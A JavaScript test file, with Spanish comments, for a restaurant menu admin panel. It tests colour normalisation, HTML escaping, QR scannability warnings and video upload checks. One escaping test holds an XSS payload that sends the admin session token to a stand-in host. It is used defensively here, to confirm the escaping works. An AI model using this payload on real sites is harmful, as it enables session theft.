// Funciones que viven en el HTML del panel y en qr.js. No son módulos, así
// que se extraen del fuente y se evalúan: así se prueba el código que se
// despliega y no una copia que puede quedarse atrás.
const { test, describe } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const vm = require('vm');

const PUBLIC = path.join(__dirname, '..', 'public');

// Extrae el trozo de fuente entre dos marcas y lo evalúa en un contexto con
// los stubs que necesite.
function cargar(archivo, desde, hasta, contexto = {}) {
	const src = fs.readFileSync(path.join(PUBLIC, archivo), 'utf8');
	const i = src.indexOf(desde);
	const f = hasta ? src.indexOf(hasta, i) : src.length;
	assert.notEqual(i, -1, `no se encontró "${desde}" en ${archivo} — ¿se renombró?`);
	const ctx = vm.createContext(contexto);
	vm.runInContext(src.slice(i, f), ctx);
	return ctx;
}

// ═══════════════════════════════════════════════════════════════
describe('hex6 · normaliza colores para el selector nativo', () => {
	const { hex6 } = cargar('index.html', 'function hex6', '// El cuadrito y el campo');

	test('expande los hex de tres dígitos', () => {
		// <input type="color"> solo admite #rrggbb: un #abc lo dejaría en
		// negro y el cuadrito no coincidiría con lo escrito.
		assert.equal(hex6('#abc'), '#aabbcc');
		assert.equal(hex6('#AABBCC'), '#aabbcc');
	});

	test('acepta las formas razonables de escribir un color', () => {
		assert.equal(hex6('#ffd521'), '#ffd521');
		assert.equal(hex6('ffd521'), '#ffd521', 'sin almohadilla');
		assert.equal(hex6('  #ffd521  '), '#ffd521', 'con espacios');
	});

	test('lo inválido conserva el valor anterior, no salta a negro', () => {
		// Si saltara a negro, el diseño se movería solo mientras alguien
		// termina de teclear el color.
		for (const malo of ['#12345', 'rojo', '', null, undefined, '#zzzzzz'])
			assert.equal(hex6(malo, '#e91e63'), '#e91e63', `con ${JSON.stringify(malo)}`);
	});

	test('los colores que la plataforma usa hoy pasan intactos', () => {
		for (const c of ['#ffd521', '#f5a623', '#cdfefe', '#a374af', '#3d568c',
		                 '#3dd68c', '#12111a', '#1a1825', '#0a0a0f', '#000000', '#ffffff'])
			assert.equal(hex6(c), c);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('esc · escapado en el panel', () => {
	const { esc } = cargar('index.html', 'function esc(s)', 'let token =');

	test('el nombre de un producto no puede inyectar código', () => {
		// Importa más que en el menú público: el superadmin abre el panel de
		// CUALQUIER restaurante y su sesión vive en sessionStorage.
		const payload = '<img src=x onerror="fetch(\'//evil/\'+sessionStorage.menuAdminToken)">';
		const salida = esc(payload);
		assert.ok(!/<[a-zA-Z]/.test(salida), 'no debe quedar ninguna etiqueta');
		assert.ok(!salida.includes('"'), 'no debe quedar comilla que abra un atributo');
	});

	test('un nombre normal se muestra igual', () => {
		assert.equal(esc('HAMBURGUESA'), 'HAMBURGUESA');
		assert.equal(esc("PA' QUE NO JODA"), 'PA&#39; QUE NO JODA');
	});

	test('nulo no imprime la palabra "null"', () => {
		assert.equal(esc(null), '');
		assert.equal(esc(undefined), '');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('Diseñador de QR · avisos de escaneabilidad', () => {
	// qrRevisarAvisos y qrLeerControles leen del DOM; se les da uno falso.
	function preparar(cfgPrevia, entradas) {
		const campos = {
			qrColorFg:   { value: entradas.fg ?? '#000000' },
			qrColorOjos: { value: entradas.ojos ?? '' },
			qrColorBg:   { value: entradas.bg ?? '#ffffff' },
			qrCartelBg:  { value: '#111111' },
			qrCartelFg:  { value: '#ffffff' },
			qrTransparente: { checked: false },
			qrUsarLogo:  { checked: false },
			qrLogoTam:   { value: '22' },
			qrMargen:    { value: String(entradas.margen ?? 4) },
			qrCartelTitulo: { value: '' },
			qrCartelPie: { value: '' },
			qrAviso:     { textContent: '', style: {} },
		};
		const ctx = cargar('qr.js', 'const QR_HEX_RE', 'function qrElegirEstilo', {
			qrCfg: { ...cfgPrevia },
			document: { getElementById: id => campos[id] || null },
		});
		ctx.qrLeerControles();
		ctx.qrRevisarAvisos();
		return { aviso: campos.qrAviso.textContent, cfg: ctx.qrCfg };
	}

	test('un color mal escrito avisa y conserva el anterior', () => {
		// Canvas ignora en silencio un fillStyle inválido y se queda con el
		// del fondo: el QR salía en blanco sin que nada lo dijera.
		const { aviso, cfg } = preparar({ fg: '#e91e63', bg: '#ffffff' }, { fg: '#12345' });
		assert.match(aviso, /Color no válido/);
		assert.equal(cfg.fg, '#e91e63', 'no se pierde el color que ya funcionaba');
	});

	test('nombra los campos concretos que están mal', () => {
		const { aviso } = preparar({ fg: '#000000', bg: '#ffffff' }, { fg: 'rojo', bg: 'blanco' });
		assert.match(aviso, /los puntos y el fondo/);
	});

	test('los formatos válidos no se marcan como inválidos', () => {
		// Ojo: #abc es #aabbcc, un azul claro que sobre blanco sí dispara el
		// aviso de contraste. Eso es correcto; aquí solo interesa que no se
		// le acuse de estar mal escrito.
		for (const [entradas, etiqueta] of [
			[{ fg: '#abc' }, 'hex de 3 dígitos'],
			[{ fg: '#AABBCC' }, 'mayúsculas'],
			[{ ojos: '' }, 'esquinas vacío = igual que los puntos'],
			[{ fg: '#000000' }, 'hex completo'],
		]) assert.doesNotMatch(preparar({}, entradas).aviso, /Color no válido/, etiqueta);
	});

	test('un margen por debajo de la norma avisa', () => {
		// La norma del QR pide 4 módulos de zona de silencio; con menos,
		// muchos lectores fallan impreso junto a otros elementos.
		assert.match(preparar({}, { margen: 0 }).aviso, /Margen de 0 módulos/);
		assert.match(preparar({}, { margen: 1 }).aviso, /Margen de 1 módulo\b/, 'singular');
		assert.doesNotMatch(preparar({}, { margen: 4 }).aviso, /Margen/);
		assert.doesNotMatch(preparar({}, { margen: 8 }).aviso, /Margen/);
	});

	test('el aviso de contraste sigue funcionando', () => {
		assert.match(preparar({}, { fg: '#ffffff', bg: '#000000' }).aviso, /claro sobre fondo oscuro/);
		assert.match(preparar({}, { fg: '#777777', bg: '#888888' }).aviso, /poco contraste/);
		assert.equal(preparar({}, { fg: '#000000', bg: '#ffffff', margen: 4 }).aviso, '', 'negro sobre blanco, sin avisos');
	});

	test('varios problemas se listan juntos, no se pisan', () => {
		const { aviso } = preparar({ fg: '#000000' }, { fg: '###', margen: 0 });
		assert.ok(aviso.split('\n').length >= 2, 'debe verlos todos de una vez');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('pintarVideoPlato · la subida de video depende del plan', () => {
	// Esconder el grupo no es la seguridad —esa vive en POST /api/video—,
	// pero sí es lo que evita ofrecerle a un restaurante algo que no ha
	// contratado y que la API le va a rechazar.
	const pantalla = () => {
		const ids = ['videoGroup', 'videoEditPreview', 'videoEditVacio',
			'btnSubirVideo', 'videoUploadStatus', 'videoFileInput',
			'videoDesdeFila', 'btnConfirmarVideo', 'videoDesde', 'videoDesdeAviso'];
		const mapa = {};
		for (const id of ids) mapa[id] = {
			style: {}, textContent: '', value: '', disabled: false,
			removeAttribute() { delete this.src; },
		};
		return mapa;
	};

	const pintar = (videos, plato, mapa) => {
		const ctx = cargar('index.html', 'let vigilanciaVideo = null;',
			'// Elegir el archivo ya no lo sube', {
				clearInterval() {},
				planActual: () => ({ videos }),
				document: { getElementById: id => mapa[id] },
			});
		ctx.pintarVideoPlato(plato);
		return mapa;
	};

	test('un plan sin video no enseña la subida', () => {
		const m = pintar(false, { id: 'p1' }, pantalla());
		assert.equal(m.videoGroup.style.display, 'none');
	});

	test('el plan de video sí la enseña', () => {
		const m = pintar(true, { id: 'p1' }, pantalla());
		assert.equal(m.videoGroup.style.display, 'block');
	});

	test('un plato sin guardar no puede recibir video todavía', () => {
		// El video se cuelga de un producto_id que aún no existe. Dejar el
		// botón vivo mandaría la subida a un 400 sin explicar por qué.
		const m = pintar(true, null, pantalla());
		assert.equal(m.btnSubirVideo.disabled, true);
		assert.match(m.videoEditVacio.textContent, /Guarda el plato primero/);
	});

	test('un plato con video ya convertido lo muestra', () => {
		const url = 'https://ejemplo.test/uploads/videos/a.mp4';
		const m = pintar(true, { id: 'p1', atributos: { video: { url } } }, pantalla());
		assert.equal(m.videoEditPreview.src, url);
		assert.equal(m.videoEditPreview.style.display, 'block');
		assert.equal(m.videoEditVacio.style.display, 'none');
	});

	test('un plato sin video no arrastra el del anterior', () => {
		// El elemento <video> es el mismo para todos los platos: si no se le
		// quita el src, abrir un plato sin video enseña el del que se miró antes.
		const m = pantalla();
		pintar(true, { id: 'p1', atributos: { video: { url: 'https://ejemplo.test/a.mp4' } } }, m);
		pintar(true, { id: 'p2' }, m);
		assert.equal(m.videoEditPreview.src, undefined, 'debe soltar el src del plato anterior');
		assert.equal(m.videoEditPreview.style.display, 'none');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('avisarSiSePasaElVideo · el trozo elegido tiene que caber', () => {
	// Se guardan 8 segundos desde el punto que marque el restaurante. Si
	// elige uno donde ya no quedan 8, el video sale más corto — y eso se
	// sabe antes de subir nada, no después de esperar minuto y medio a que
	// ffmpeg termine.
	const conVideo = (duracion, desde) => {
		const mapa = {
			videoEditPreview:  { duration: duracion },
			videoDesde:        { value: String(desde) },
			videoDesdeAviso:   { textContent: 'sucio' },
			btnConfirmarVideo: { disabled: false, style: {} },
		};
		const ctx = cargar('index.html', 'const DURACION_MIN_VIDEO',
			'async function confirmarSubidaVideo',
			{ document: { getElementById: id => mapa[id] } });
		ctx.avisarSiSePasaElVideo();
		return { aviso: mapa.videoDesdeAviso.textContent, bloqueado: mapa.btnConfirmarVideo.disabled };
	};

	test('con hueco de sobra no dice nada', () => {
		assert.equal(conVideo(30, 5).aviso, '', 'quedan 25 s, no hay nada que avisar');
	});

	test('justo en el límite tampoco', () => {
		assert.equal(conVideo(30, 22).aviso, '', 'quedan exactamente 8 s');
	});

	test('avisa cuando el trozo se queda corto', () => {
		assert.match(conVideo(30, 26).aviso, /4\.0 s/, 'quedan 4 s y hay que decirlo');
	});

	test('no muestra segundos negativos si se pasa del final', () => {
		// Escribir 40 en un video de 30 daba "-10.0 s", que no significa nada.
		assert.match(conVideo(30, 40).aviso, /0\.0 s/);
	});

	test('sin metadatos todavía no aventura nada', () => {
		// La duración no se conoce hasta loadedmetadata; hasta entonces es NaN
		// y un aviso calculado con eso sería basura.
		assert.equal(conVideo(NaN, 5).aviso, '');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('avisarSiSePasaElVideo · lo demasiado corto no se sube', () => {
	// Idea del propio usuario, y es mejor que convertirlo igual: un bucle de
	// un segundo en una carta marea. Más vale decirlo antes de que suban
	// treinta megas para nada.
	const conVideo = (duracion, desde) => {
		const mapa = {
			videoEditPreview:  { duration: duracion },
			videoDesde:        { value: String(desde) },
			videoDesdeAviso:   { textContent: '' },
			btnConfirmarVideo: { disabled: false, style: {} },
		};
		const ctx = cargar('index.html', 'const DURACION_MIN_VIDEO',
			'async function confirmarSubidaVideo',
			{ document: { getElementById: id => mapa[id] } });
		ctx.avisarSiSePasaElVideo();
		return { aviso: mapa.videoDesdeAviso.textContent, bloqueado: mapa.btnConfirmarVideo.disabled };
	};

	test('un video de un segundo no deja subir', () => {
		const r = conVideo(1, 0);
		assert.equal(r.bloqueado, true);
		assert.match(r.aviso, /al menos 3/);
	});

	test('justo en el mínimo sí deja', () => {
		assert.equal(conVideo(3, 0).bloqueado, false, '3 s exactos son válidos');
	});

	test('un video largo con el punto casi al final tampoco deja', () => {
		// Lo que importa no es cuánto dura el original sino cuánto queda desde
		// donde empieza el recorte.
		assert.equal(conVideo(40, 38).bloqueado, true, 'quedan 2 s de 40');
		assert.equal(conVideo(40, 30).bloqueado, false, 'quedan 10 s');
	});

	test('volver a un punto válido vuelve a permitir', () => {
		// El botón se deshabilita, y si no se rehabilitara al corregir el
		// número el usuario se quedaría encerrado sin saber por qué.
		assert.equal(conVideo(20, 19).bloqueado, true);
		assert.equal(conVideo(20, 5).bloqueado, false);
	});

	test('sin metadatos no se bloquea nada', () => {
		// La duración llega con loadedmetadata. Bloquear antes dejaría el botón
		// muerto en los milisegundos previos y parecería roto.
		assert.equal(conVideo(NaN, 0).bloqueado, false);
	});
});
